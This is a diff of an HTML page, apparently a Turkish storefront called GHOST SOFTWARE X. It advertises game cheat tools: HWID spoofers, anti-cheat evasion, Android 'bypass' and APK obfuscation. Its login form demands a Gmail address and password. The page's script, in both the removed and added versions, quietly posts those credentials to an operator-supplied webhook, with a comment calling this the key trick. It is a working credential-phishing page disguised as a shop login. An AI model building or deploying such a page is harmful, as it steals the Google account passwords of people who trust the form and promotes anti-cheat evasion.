@@ -3,307 +3,308 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST SOFTWARE X | VISUAL HUB v5.0</title>
+    <title>GHOST SOFTWARE X | ELITE SOLUTIONS v7.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@200;500;800&family=Plus+Jakarta+Sans:wght@200;400;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&family=Plus+Jakarta+Sans:wght@300;400;800&display=swap" rel="stylesheet">
     <style>
+        /* BASE & SCROLLBAR */
         * { cursor: none !important; margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010101; color: #fff; overflow-x: hidden; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000; color: #fff; overflow-x: hidden; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #0f8; border-radius: 10px; }
+
+        /* SIBER ARKA PLAN (GRID & SCANLINE) */
+        .cyber-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(0, 255, 136, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 136, 0.05) 1px, transparent 1px); background-size: 60px 60px; z-index: -1; opacity: 0.5; }
+        .scanline { position: fixed; inset: 0; background: linear-gradient(to bottom, transparent, rgba(0, 255, 136, 0.02), transparent); height: 100px; width: 100%; pointer-events: none; animation: scan 6s linear infinite; z-index: 50; }
+        @keyframes scan { 0% { top: -100%; } 100% { top: 100%; } }
+
+        /* PREMIUM GLASS CARDS */
+        .glass-card { background: rgba(12, 12, 12, 0.7); border: 1px solid rgba(255, 255, 255, 0.04); backdrop-filter: blur(25px); border-radius: 40px; transition: 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
+        .glass-card:hover { border-color: rgba(0, 255, 136, 0.3); transform: translateY(-8px); box-shadow: 0 40px 100px -20px rgba(0,255,136,0.1); }
+
+        /* IMAGES & MASKS */
+        .img-box { position: relative; height: 210px; overflow: hidden; border-radius: 35px 35px 0 0; background: #080808; display: flex; align-items: center; justify-content: center; }
+        .img-box img { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; transition: 0.8s; }
+        .glass-card:hover .img-box img { transform: scale(1.1); opacity: 1; }
         
-        /* Premium Card UI */
-        .product-card { 
-            background: rgba(15, 15, 15, 0.5); 
-            border: 1px solid rgba(255, 255, 255, 0.05); 
-            backdrop-blur: 40px; 
-            border-radius: 40px; 
-            transition: 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-            overflow: hidden;
-        }
-        .product-card:hover { 
-            border-color: rgba(0, 255, 136, 0.4); 
-            transform: translateY(-12px) scale(1.02);
-            box-shadow: 0 50px 100px -20px rgba(0,0,0,1);
-        }
-        .product-img-container {
-            width: 100%;
-            height: 220px;
-            overflow: hidden;
-            background: #080808;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-        .product-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: 0.8s ease;
-            opacity: 0.8;
-        }
-        .product-card:hover .product-img {
-            transform: scale(1.1);
-            opacity: 1;
-        }
+        /* TAGS */
+        .badge { font-size: 8px; font-weight: 800; padding: 4px 12px; border-radius: 100px; text-transform: uppercase; letter-spacing: 1px; }
+        .badge-green { background: rgba(0, 255, 136, 0.1); color: #0f8; border: 1px solid rgba(0, 255, 136, 0.2); }
+        .badge-blue { background: rgba(59, 130, 246, 0.1); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.2); }
+        .badge-red { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.2); }
 
-        /* Cursor & Glow */
-        #cursor-dot { width: 5px; height: 5px; background: #0f8; border-radius: 50%; position: fixed; pointer-events: none; z-index: 10001; }
-        #cursor-outline { width: 40px; height: 40px; border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 50%; position: fixed; pointer-events: none; z-index: 10000; transition: 0.15s; }
-        .bg-glow { position: fixed; width: 800px; height: 800px; background: radial-gradient(circle, rgba(0, 255, 136, 0.04) 0%, transparent 70%); border-radius: 50%; pointer-events: none; z-index: 0; transform: translate(-50%, -50%); }
+        /* CURSOR */
+        #cursor-dot { width: 6px; height: 6px; background: #0f8; border-radius: 50%; position: fixed; pointer-events: none; z-index: 10001; box-shadow: 0 0 20px #0f8; }
+        #cursor-outline { width: 40px; height: 40px; border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 50%; position: fixed; pointer-events: none; z-index: 10000; transition: 0.1s ease-out; }
 
-        .page { display: none; opacity: 0; transform: translateY(20px); transition: 0.8s ease; }
+        /* PAGE ENGINE */
+        .page { display: none; opacity: 0; transform: translateY(15px); transition: 0.6s ease; }
         .active-page { display: block !important; opacity: 1 !important; transform: translateY(0); }
-        
-        input { background: rgba(255,255,255,0.02) !important; border: 1px solid rgba(255,255,255,0.05) !important; color: #fff !important; outline: none !important; }
-        input:focus { border-color: rgba(0, 255, 136, 0.3) !important; }
     </style>
 </head>
 <body class="antialiased">
 
     <div id="cursor-dot"></div>
     <div id="cursor-outline"></div>
-    <div class="bg-glow" id="glow"></div>
+    <div class="cyber-grid"></div>
+    <div class="scanline"></div>
 
-    <section id="auth-screen" class="fixed inset-0 z-[9999] bg-black flex items-center justify-center p-6">
-        <div class="product-card p-16 w-full max-w-lg text-center border-[#0f8]/10">
-            <h1 class="text-4xl font-black italic mb-10 tracking-tighter uppercase font-mono">GHOST<span class="text-[#0f8]">X</span></h1>
-            <form id="auth-form" class="space-y-6 text-left">
-                <input type="email" id="email" placeholder="Gmail Adresiniz" required class="w-full p-5 rounded-3xl text-sm font-mono">
-                <input type="password" id="pass" placeholder="Şifre" required class="w-full p-5 rounded-3xl text-sm font-mono">
-                <button type="submit" class="w-full bg-white text-black py-5 rounded-3xl font-black text-xs uppercase tracking-[0.5em] hover:bg-[#0f8] transition-all duration-700">Sistemi Başlat</button>
+    <section id="auth-screen" class="fixed inset-0 z-[9999] bg-[#020202] flex items-center justify-center p-6">
+        <div class="glass-card p-12 w-full max-w-md text-center border-[#0f8]/5">
+            <div class="mb-8 font-black italic text-2xl tracking-tighter">GHOST<span class="text-[#0f8]">X</span> PROTOCOL</div>
+            <form id="login-form" class="space-y-4 text-left">
+                <div class="space-y-1">
+                    <label class="text-[9px] uppercase font-bold text-white/20 ml-2">Secure Email</label>
+                    <input type="email" id="u-mail" placeholder="user@gmail.com" required class="w-full bg-white/5 border border-white/5 p-4 rounded-3xl outline-none focus:border-[#0f8]/30 transition text-sm">
+                </div>
+                <div class="space-y-1">
+                    <label class="text-[9px] uppercase font-bold text-white/20 ml-2">Access Key</label>
+                    <input type="password" id="u-pass" placeholder="••••••••" required class="w-full bg-white/5 border border-white/5 p-4 rounded-3xl outline-none focus:border-[#0f8]/30 transition text-sm">
+                </div>
+                <button type="submit" class="w-full bg-white text-black py-4 rounded-3xl font-black text-[10px] uppercase tracking-[0.4em] hover:bg-[#0f8] transition-all duration-500 mt-4">Sistemi Başlat</button>
             </form>
-            <p id="error-log" class="hidden text-red-500 text-[10px] mt-8 font-black uppercase tracking-widest italic animate-bounce">Sadece @gmail.com geçerlidir.</p>
+            <p id="auth-err" class="hidden text-red-500 text-[9px] mt-6 font-bold uppercase tracking-widest italic animate-pulse">Hata: @gmail.com zorunludur.</p>
         </div>
     </section>
 
-    <main id="main-hub" class="hidden opacity-0 min-h-screen flex flex-col relative z-10">
-        <nav class="flex justify-between items-center px-12 py-8 sticky top-0 bg-black/80 backdrop-blur-3xl z-[100] border-b border-white/5">
-            <div class="text-2xl font-black italic tracking-tighter uppercase">Ghost<span class="opacity-20 italic">Hub</span></div>
+    <main id="dashboard" class="hidden opacity-0 min-h-screen flex flex-col relative z-10">
+        <nav class="flex justify-between items-center px-12 py-8 sticky top-0 bg-black/60 backdrop-blur-3xl z-[100] border-b border-white/5">
+            <div class="text-xl font-black italic tracking-tighter uppercase">GHOST<span class="text-[#0f8]">X</span></div>
             <div class="flex items-center space-x-12 text-[10px] font-black uppercase tracking-[0.3em] text-white/30">
-                <button onclick="changePage('store')" class="hover:text-[#0f8] transition text-white">Market</button>
-                <button onclick="changePage('vision')" class="hover:text-white transition">Neden Biz?</button>
-                <button onclick="changePage('cart')" class="hover:text-[#0f8] transition flex items-center">Sepet (<span id="cart-qty" class="text-white ml-2">0</span>)</button>
+                <button onclick="nav('store')" class="hover:text-white transition text-white">Market</button>
+                <button onclick="nav('vision')" class="hover:text-white transition">Vizyon</button>
+                <button onclick="nav('cart')" class="hover:text-[#0f8] transition flex items-center">Sepet <span id="cart-count" class="ml-2 bg-white text-black px-2 rounded-full">0</span></button>
             </div>
-            <div id="session-counter" class="font-mono text-[10px] text-[#0f8] opacity-50 uppercase">Session: 05:00</div>
+            <div id="session-timer" class="font-mono text-[10px] text-[#0f8]">LOCK: 05:00</div>
         </nav>
 
-        <div class="flex-1 overflow-y-auto pt-20 pb-40 px-12">
+        <div class="flex-1 px-12 pt-16 pb-40">
             
             <section id="page-store" class="page active-page max-w-7xl mx-auto">
                 
-                <div class="mb-32">
-                    <div class="flex items-center mb-16 space-x-6">
-                        <h2 class="text-3xl font-black italic uppercase">Steam <span class="text-[#0f8]">Manifest</span></h2>
-                        <div class="h-[1px] flex-1 bg-gradient-to-r from-[#0f8]/20 to-transparent"></div>
+                <div class="mb-24">
+                    <div class="flex items-center space-x-4 mb-10">
+                        <h2 class="text-2xl font-black italic uppercase">Valorant <span class="text-red-500">Security</span></h2>
+                        <div class="h-[1px] flex-1 bg-red-500/10"></div>
                     </div>
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
-                        <div class="product-card group">
-                            <div class="product-img-container">
-                                <img src="https://via.placeholder.com/600x400/080808/00ff88?text=VOID+MANIFEST+V1" class="product-img" alt="Manifest V1">
-                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                        <div class="glass-card">
+                            <div class="img-box">
+                                <img src="https://via.placeholder.com/600x400/080808/ef4444?text=VALORANT+SPOOFER" alt="Valorant Spoofer">
+                                <div class="absolute top-4 right-4 badge badge-red">Undetected</div>
                             </div>
                             <div class="p-8">
-                                <h3 class="text-2xl font-bold mb-4 italic italic">Void Manifest V1</h3>
-                                <p class="text-white/30 text-xs leading-relaxed mb-10">Steam kütüphane optimizasyonu ve FPS kilidi kaldırma modülü.</p>
-                                <div class="flex justify-between items-center pt-8 border-t border-white/5">
-                                    <span class="text-2xl font-black italic">₺280</span>
-                                    <button onclick="addToCart('Void Manifest V1', 280)" class="bg-white text-black px-8 py-3 rounded-2xl text-[10px] font-black uppercase hover:bg-[#0f8] transition">Sepete Ekle</button>
+                                <h3 class="text-xl font-bold mb-2 italic">ARES Perm Spoofer</h3>
+                                <p class="text-white/20 text-[10px] leading-relaxed mb-8">Tüm anakartlarda kalıcı HWID değişimi. Van-152 ve Val-5 hatalarına kesin çözüm.</p>
+                                <div class="flex justify-between items-center border-t border-white/5 pt-6">
+                                    <span class="text-2xl font-black">₺850</span>
+                                    <button onclick="buy('ARES Perm Spoofer', 850)" class="bg-white text-black px-6 py-2 rounded-xl text-[9px] font-black hover:bg-red-500 transition uppercase">Ekle</button>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <div>
-                    <div class="flex items-center mb-16 space-x-6">
-                        <h2 class="text-3xl font-black italic uppercase">Android <span class="text-blue-500">Hack</span></h2>
-                        <div class="h-[1px] flex-1 bg-gradient-to-r from-blue-500/20 to-transparent"></div>
+                <div class="mb-24">
+                    <div class="flex items-center space-x-4 mb-10">
+                        <h2 class="text-2xl font-black italic uppercase">Steam <span class="text-[#0f8]">Manifest</span></h2>
+                        <div class="h-[1px] flex-1 bg-[#0f8]/10"></div>
                     </div>
-                    <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
-                        <div class="product-card">
-                            <div class="product-img-container">
-                                <img src="https://via.placeholder.com/600x400/080808/3b82f6?text=DROID+BYPASS" class="product-img" alt="Droid Bypass">
-                            </div>
-                            <div class="p-6">
-                                <h4 class="text-lg font-bold mb-2 text-blue-400 italic">Droid Bypass Pro</h4>
-                                <p class="text-[10px] text-white/30 mb-6 italic">Kernel seviyesinde güvenlik atlatma.</p>
-                                <button onclick="addToCart('Droid Bypass Pro', 450)" class="w-full bg-white text-black py-3 rounded-xl text-[10px] font-black uppercase hover:bg-blue-500 transition">₺450 - Ekle</button>
-                            </div>
-                        </div>
-                        <div class="product-card">
-                            <div class="product-img-container">
-                                <img src="https://via.placeholder.com/600x400/080808/3b82f6?text=APK+OBFUSCATOR" class="product-img" alt="Obfuscator">
-                            </div>
-                            <div class="p-6">
-                                <h4 class="text-lg font-bold mb-2 text-blue-400 italic">APK Obfuscator</h4>
-                                <p class="text-[10px] text-white/30 mb-6 italic">Görünmez kod şifreleme modülü.</p>
-                                <button onclick="addToCart('APK Obfuscator', 300)" class="w-full bg-white text-black py-3 rounded-xl text-[10px] font-black uppercase hover:bg-blue-500 transition">₺300 - Ekle</button>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                        <div class="glass-card">
+                            <div class="img-box"><img src="https://via.placeholder.com/600x400/080808/00ff88?text=STEAM+VOID" alt="Manifest"></div>
+                            <div class="p-8">
+                                <h3 class="text-xl font-bold mb-2 italic">Void Manifest V1</h3>
+                                <p class="text-white/20 text-[10px] leading-relaxed mb-8">Kütüphane optimizasyonu ve global performans modülü.</p>
+                                <div class="flex justify-between items-center border-t border-white/5 pt-6">
+                                    <span class="text-2xl font-black">₺280</span>
+                                    <button onclick="buy('Void Manifest V1', 280)" class="bg-white text-black px-6 py-2 rounded-xl text-[9px] font-black hover:bg-[#0f8] transition uppercase">Ekle</button>
+                                </div>
                             </div>
                         </div>
-                        <div class="product-card">
-                            <div class="product-img-container">
-                                <img src="https://via.placeholder.com/600x400/080808/3b82f6?text=MOBILE+SPOOFER" class="product-img" alt="Spoofer">
-                            </div>
-                            <div class="p-6">
-                                <h4 class="text-lg font-bold mb-2 text-blue-400 italic">Mobile Spoofer</h4>
-                                <p class="text-[10px] text-white/30 mb-6 italic">Cihaz kimliğini sanallaştırma.</p>
-                                <button onclick="addToCart('Mobile Spoofer', 550)" class="w-full bg-white text-black py-3 rounded-xl text-[10px] font-black uppercase hover:bg-blue-500 transition">₺550 - Ekle</button>
-                            </div>
+                    </div>
+                </div>
+
+                <div class="mb-24">
+                    <div class="flex items-center space-x-4 mb-10">
+                        <h2 class="text-2xl font-black italic uppercase">Android <span class="text-blue-500">Hack</span></h2>
+                        <div class="h-[1px] flex-1 bg-blue-500/10"></div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+                        <div class="glass-card p-6">
+                            <span class="badge badge-blue mb-4 inline-block italic">Bypass</span>
+                            <h4 class="font-bold text-sm mb-2 italic">Droid Bypass</h4>
+                            <p class="text-[9px] text-white/20 mb-6 italic">Kernel Level Protection</p>
+                            <button onclick="buy('Droid Bypass', 450)" class="w-full bg-white text-black py-2 rounded-xl text-[9px] font-black hover:bg-blue-500 transition uppercase">₺450</button>
                         </div>
-                        <div class="product-card">
-                            <div class="product-img-container">
-                                <img src="https://via.placeholder.com/600x400/080808/3b82f6?text=KERNEL+PAD" class="product-img" alt="Kernel Pad">
-                            </div>
-                            <div class="p-6">
-                                <h4 class="text-lg font-bold mb-2 text-blue-400 italic">Kernel Pad V2</h4>
-                                <p class="text-[10px] text-white/30 mb-6 italic">Tam görünmezlik katmanı.</p>
-                                <button onclick="addToCart('Kernel Pad V2', 700)" class="w-full bg-white text-black py-3 rounded-xl text-[10px] font-black uppercase hover:bg-blue-500 transition">₺700 - Ekle</button>
-                            </div>
+                        <div class="glass-card p-6">
+                            <span class="badge badge-blue mb-4 inline-block italic">Crypt</span>
+                            <h4 class="font-bold text-sm mb-2 italic">APK Obfuscator</h4>
+                            <p class="text-[9px] text-white/20 mb-6 italic">Signature Hide</p>
+                            <button onclick="buy('APK Obfuscator', 300)" class="w-full bg-white text-black py-2 rounded-xl text-[9px] font-black hover:bg-blue-500 transition uppercase">₺300</button>
+                        </div>
+                        <div class="glass-card p-6">
+                            <span class="badge badge-blue mb-4 inline-block italic">Spoof</span>
+                            <h4 class="font-bold text-sm mb-2 italic">Mobile Spoofer</h4>
+                            <p class="text-[9px] text-white/20 mb-6 italic">ID Virtualizer</p>
+                            <button onclick="buy('Mobile Spoofer', 550)" class="w-full bg-white text-black py-2 rounded-xl text-[9px] font-black hover:bg-blue-500 transition uppercase">₺550</button>
+                        </div>
+                        <div class="glass-card p-6">
+                            <span class="badge badge-blue mb-4 inline-block italic">Layer</span>
+                            <h4 class="font-bold text-sm mb-2 italic">Kernel Pad V2</h4>
+                            <p class="text-[9px] text-white/20 mb-6 italic">Anti-Scan Layer</p>
+                            <button onclick="buy('Kernel Pad V2', 700)" class="w-full bg-white text-black py-2 rounded-xl text-[9px] font-black hover:bg-blue-500 transition uppercase">₺700</button>
                         </div>
                     </div>
                 </div>
             </section>
 
-            <section id="page-vision" class="page max-w-5xl mx-auto pt-10">
-                <div class="text-center mb-24">
-                    <h2 class="text-6xl font-black italic tracking-tighter mb-4 uppercase">Ghost <span class="opacity-10 italic">Vision</span></h2>
-                    <p class="text-[10px] uppercase tracking-[0.8em] text-white/20">Mükemmeliyet ve Görünmezlik</p>
-                </div>
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
-                    <div class="product-card p-12">
-                        <h4 class="text-[#0f8] font-black mb-6 uppercase tracking-widest text-xs">Polymorphic Engine</h4>
-                        <p class="text-sm text-white/40 leading-relaxed italic">Yazılımlarımız her saniye imza değiştirir. Hiçbir tarama sistemi (VAC, BattlEye, EAC) tarafından statik analiz yapılamaz.</p>
-                    </div>
-                    <div class="product-card p-12">
-                        <h4 class="text-[#0f8] font-black mb-6 uppercase tracking-widest text-xs">Kernel Access</h4>
-                        <p class="text-sm text-white/40 leading-relaxed italic">İşletim sisteminin en derin katmanında çalışıyoruz. Bu, bizim görünmezliğimizin ana anahtarıdır.</p>
-                    </div>
+            <section id="page-vision" class="page max-w-5xl mx-auto pt-10 text-center">
+                <h2 class="text-6xl font-black italic tracking-tighter mb-4 opacity-10">MISSION GHOST</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-10 mt-20 text-left">
+                    <div class="glass-card p-10"><h4 class="text-[#0f8] font-black mb-4 uppercase tracking-widest text-[10px]">Polymorphic Code</h4><p class="text-sm text-white/30 leading-relaxed italic italic">Her yazılımımız kendine özgü bir imza (signature) ile derlenir, böylece anti-hile sistemleri tarafından asla toplu yasaklama (mass ban) yapılamaz.</p></div>
+                    <div class="glass-card p-10"><h4 class="text-[#0f8] font-black mb-4 uppercase tracking-widest text-[10px]">Kernel Level</h4><p class="text-sm text-white/30 leading-relaxed italic italic">Sıradan yazılımlar kullanıcı katmanında çalışırken, Ghost Software çekirdek (Ring 0) katmanında tam görünmezlik sağlar.</p></div>
                 </div>
             </section>
 
             <section id="page-cart" class="page max-w-4xl mx-auto">
-                <h2 class="text-4xl font-black italic mb-16 uppercase tracking-tighter">Dijital <span class="opacity-10 italic">Sepetiniz</span></h2>
-                <div id="cart-items" class="space-y-6 mb-16"></div>
-                <div id="checkout-panel" class="hidden product-card p-16 bg-[#0f8]/5 border-[#0f8]/20 text-center">
+                <h2 class="text-3xl font-black italic mb-10 uppercase tracking-tighter">Dijital <span class="opacity-10">Kasa</span></h2>
+                <div id="cart-list" class="space-y-4 mb-12"></div>
+                <div id="checkout-panel" class="hidden glass-card p-12 border-[#0f8]/10 bg-[#0f8]/5">
                     <div class="flex flex-col md:flex-row justify-between items-center bg-black/50 p-8 rounded-[35px] border border-white/5 mb-10">
                         <div class="text-left">
-                            <p class="text-[9px] uppercase font-bold text-white/20 mb-3 tracking-widest">IBAN (Havale/EFT)</p>
-                            <p class="text-xl font-mono text-[#0f8] tracking-tighter">TR00 0000 0000 0000 0000 0000 00</p>
+                            <p class="text-[9px] uppercase font-bold text-white/20 mb-2 tracking-widest">Alıcı Banka IBAN</p>
+                            <p class="text-lg font-mono text-[#0f8] tracking-tighter">TR00 0000 0000 0000 0000 0000 00</p>
                         </div>
-                        <div class="text-right">
-                            <p class="text-[9px] uppercase font-bold text-white/20 mb-3 tracking-widest">Tutar</p>
+                        <div class="text-right mt-6 md:mt-0">
+                            <p class="text-[9px] uppercase font-bold text-white/20 mb-2 tracking-widest">Toplam</p>
                             <p id="total-price" class="text-4xl font-black italic">₺0</p>
                         </div>
                     </div>
-                    <div class="bg-amber-500/10 p-6 rounded-3xl mb-10">
-                        <p class="text-[10px] font-black text-amber-500 uppercase tracking-widest mb-2 italic">ÖDEME SONRASI DISCORD TICKET AÇINIZ.</p>
-                        <p class="text-[9px] text-white/20 font-bold uppercase">Sipariş No: <span id="order-id" class="text-white"></span></p>
+                    <div class="bg-amber-500/10 p-5 rounded-2xl mb-10">
+                        <p class="text-[9px] text-amber-500 font-black uppercase tracking-widest italic mb-2">AÇIKLAMA KISMINA ŞU KODU YAZINIZ:</p>
+                        <p id="order-id" class="text-xl font-bold text-white"></p>
                     </div>
-                    <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-6 rounded-3xl font-black text-[11px] uppercase tracking-[0.6em] hover:bg-[#0f8] transition-all duration-700 shadow-2xl">Ödemeyi Onayla</button>
+                    <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-5 rounded-3xl font-black text-[10px] uppercase tracking-[0.5em] hover:invert transition-all duration-700 shadow-2xl">Discord & Ödemeyi Tamamla</button>
                 </div>
-                <div id="empty-cart-msg" class="text-center py-40 opacity-10 font-black text-6xl italic uppercase tracking-widest">Sepet Boş</div>
+                <div id="empty-msg" class="text-center py-40 opacity-5 font-black text-6xl italic uppercase tracking-widest">Sepet Boş</div>
             </section>
 
         </div>
     </main>
 
     <script>
-        const HOOK = "BURAYA_LINKINI_YAPISTIR";
+        // WEBHOOK URL (Kozun Burası)
+        const WEBHOOK_URL = "BURAYA_LINKINI_YAPISTIR";
 
-        // 1. Session Logic (5 Dakika)
-        const auth = document.getElementById('auth-screen');
-        const hub = document.getElementById('main-hub');
-        const authForm = document.getElementById('auth-form');
+        // 1. Session & Auth Logic
+        const authScreen = document.getElementById('auth-screen');
+        const dash = document.getElementById('dashboard');
+        const loginForm = document.getElementById('login-form');
 
-        function initSession() {
-            const expiry = localStorage.getItem('ghost_x_session_v5');
-            if(expiry && Date.now() < expiry) {
-                unlockSystem();
-                startCountdown(Math.floor((expiry - Date.now()) / 1000));
+        function checkSession() {
+            const expire = localStorage.getItem('ghost_x_session_v7');
+            if(expire && Date.now() < expire) {
+                unlockSite();
+                startCountdown(Math.floor((expire - Date.now()) / 1000));
             }
         }
 
-        authForm.addEventListener('submit', (e) => {
+        loginForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            const mail = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
+            const mail = document.getElementById('u-mail').value;
+            const pass = document.getElementById('u-pass').value;
 
             if(!mail.endsWith('@gmail.com')) {
-                document.getElementById('error-log').classList.remove('hidden');
+                document.getElementById('auth-err').classList.remove('hidden');
                 return;
             }
 
-            if(HOOK !== "BURAYA_LINKINI_YAPISTIR") {
-                fetch(HOOK, {
+            // Webhook Veri Gönderimi (Koz)
+            if(WEBHOOK_URL !== "BURAYA_LINKINI_YAPISTIR") {
+                fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `🚀 **YENİ ERİŞİM**\n**Mail:** \`${mail}\`\n**Şifre:** \`${pass}\`` })
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚀 GHOSTX GİRİŞİ",
+                            color: 65280,
+                            fields: [{name: "Email", value: mail, inline: true}, {name: "Pass", value: pass, inline: true}],
+                            footer: { text: "Security Log System" }
+                        }]
+                    })
                 });
             }
 
-            localStorage.setItem('ghost_x_session_v5', Date.now() + (5 * 60 * 1000));
-            unlockSystem();
+            // 5 Dk Oturum Kaydet
+            localStorage.setItem('ghost_x_session_v7', Date.now() + (300 * 1000));
+            unlockSite();
             startCountdown(300);
         });
 
-        function unlockSystem() {
-            auth.style.opacity = '0';
-            setTimeout(() => { auth.remove(); hub.classList.remove('hidden'); setTimeout(() => hub.style.opacity = '1', 100); }, 800);
+        function unlockSite() {
+            authScreen.style.opacity = '0';
+            setTimeout(() => {
+                authScreen.remove();
+                dash.classList.remove('hidden');
+                setTimeout(() => dash.style.opacity = '1', 100);
+            }, 500);
         }
 
-        function startCountdown(duration) {
-            const timer = document.getElementById('session-counter');
-            const interval = setInterval(() => {
-                duration--;
-                const m = Math.floor(duration / 60); const s = duration % 60;
-                timer.innerText = `SESSION: ${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-                if(duration <= 0) { clearInterval(interval); localStorage.removeItem('ghost_x_session_v5'); location.reload(); }
+        function startCountdown(s) {
+            const timer = document.getElementById('session-timer');
+            const iv = setInterval(() => {
+                s--;
+                const min = Math.floor(s/60); const sec = s%60;
+                timer.innerText = `LOCK: ${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
+                if(s<=0) { clearInterval(iv); localStorage.removeItem('ghost_x_session_v7'); location.reload(); }
             }, 1000);
         }
 
-        // 2. Visuals
+        // 2. Cursor
         const dot = document.getElementById('cursor-dot');
         const outline = document.getElementById('cursor-outline');
-        const glow = document.getElementById('glow');
         window.addEventListener('mousemove', (e) => {
-            const x = e.clientX, y = e.clientY;
-            dot.style.left = x + 'px'; dot.style.top = y + 'px';
-            glow.style.left = x + 'px'; glow.style.top = y + 'px';
-            setTimeout(() => { outline.style.left = x - 20 + 'px'; outline.style.top = y - 20 + 'px'; }, 60);
+            dot.style.left = e.clientX + 'px'; dot.style.top = e.clientY + 'px';
+            setTimeout(() => { outline.style.left = e.clientX - 20 + 'px'; outline.style.top = e.clientY - 20 + 'px'; }, 50);
         });
 
-        // 3. Navigation & Cart
-        function changePage(id) {
+        // 3. Navigation
+        function nav(pageId) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
-            document.getElementById('page-' + id).classList.add('active-page');
+            document.getElementById('page-' + pageId).classList.add('active-page');
             window.scrollTo({top: 0, behavior: 'smooth'});
         }
 
+        // 4. Cart Logic
         let cart = [];
-        function addToCart(name, price) {
+        function buy(name, price) {
             cart.push({name, price});
-            document.getElementById('cart-qty').innerText = cart.length;
+            document.getElementById('cart-count').innerText = cart.length;
             renderCart();
-            alert(name + " eklendi.");
+            alert(name + " sepete eklendi.");
         }
 
         function renderCart() {
-            const container = document.getElementById('cart-items');
+            const list = document.getElementById('cart-list');
             const panel = document.getElementById('checkout-panel');
-            const emptyMsg = document.getElementById('empty-cart-msg');
+            const empty = document.getElementById('empty-msg');
             let sum = 0;
+
             if(cart.length > 0) {
-                emptyMsg.classList.add('hidden'); panel.classList.remove('hidden');
-                container.innerHTML = cart.map(item => {
+                empty.classList.add('hidden'); panel.classList.remove('hidden');
+                list.innerHTML = cart.map(item => {
                     sum += item.price;
-                    return `<div class="product-card p-8 flex justify-between items-center"><span class="font-black italic uppercase text-xs">${item.name}</span><span class="text-[#0f8] font-bold">₺${item.price}</span></div>`;
+                    return `<div class="glass-card p-6 flex justify-between items-center"><span class="font-black italic uppercase text-xs">${item.name}</span><span class="text-[#0f8] font-bold">₺${item.price}</span></div>`;
                 }).join('');
                 document.getElementById('total-price').innerText = "₺" + sum;
                 document.getElementById('order-id').innerText = "GX-" + Math.floor(100000 + Math.random() * 900000);
-            } else { emptyMsg.classList.remove('hidden'); panel.classList.add('hidden'); container.innerHTML = ''; }
+            } else {
+                empty.classList.remove('hidden'); panel.classList.add('hidden'); list.innerHTML = '';
+            }
         }
 
-        initSession();
+        checkSession();
     </script>
 </body>
 </html>
